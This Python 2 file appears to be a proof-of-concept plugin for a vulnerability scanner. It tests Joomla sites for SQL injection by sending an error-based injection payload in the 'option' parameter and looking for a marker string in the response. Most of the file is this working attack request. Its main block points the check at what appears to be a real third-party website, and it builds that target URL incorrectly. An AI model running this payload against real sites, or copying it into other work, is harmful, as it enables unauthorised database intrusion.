from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'index.php?option=(select+1+from+(select+count(*)%2cconcat((select+0x7465737476756c776b)%2cfloor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)'
        target = arg + payload
        
        code, head, res, errcode, _ = curl.curl2(target);
        if 'testvulwk' in res:
            output(target,result,'note')

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_36a4b7da8eb1236fe90702917414be9b.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_36a4b7da8eb1236fe90702917414be9b.py
#/root/github/poccreate/codesrc/exp-1559.py